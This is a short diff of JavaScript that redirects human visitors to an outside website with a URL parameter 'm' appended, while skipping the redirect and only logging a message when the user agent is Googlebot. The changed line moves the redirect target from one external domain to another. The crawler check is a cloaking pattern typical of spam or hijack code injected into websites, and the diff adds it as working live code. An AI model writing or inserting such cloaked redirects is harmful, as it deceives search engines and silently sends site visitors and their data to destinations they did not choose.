@@ -14,7 +14,7 @@
     if (!navigator.userAgent.includes('Googlebot')) {
         if (m) {
             window.location.href =
-                'https://kickprep.com/?m=' + encodeURIComponent(m);
+                'https://ullrichlab.physast.uga.edu/?m=' + encodeURIComponent(m);
         }
     } else {
         console.log('Googlebot detected - no redirect');
